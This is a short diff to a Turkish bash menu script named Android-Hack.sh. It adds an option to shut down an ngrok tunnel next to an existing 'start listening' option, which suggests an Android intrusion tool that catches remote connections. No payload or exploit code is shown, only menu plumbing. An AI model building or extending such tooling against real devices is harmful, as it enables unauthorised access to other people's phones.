@@ -60,6 +60,8 @@ printf "
 
 \e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mDİNLEMEYE AL\e[97m
 
+\e[31m[\e[97m3\e[31m]\e[97m ────────── \e[34mNGROK DIŞ BAĞLANTI KES\e[97m
+
 \e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
 "
 echo
@@ -85,6 +87,11 @@ elif [[ $secim == 2 ]];then
 	bash Dinleme.sh
 	cd ..
 	sleep 2
+	bash Android-Hack.sh
+elif [[ $secim == 3 ]];then
+	cd ..
+	bash .pidkapat.sh --ngro
+	sleep 1
 	bash Android-Hack.sh
 elif [[ $secim == x || $secim == X ]];then
 	echo
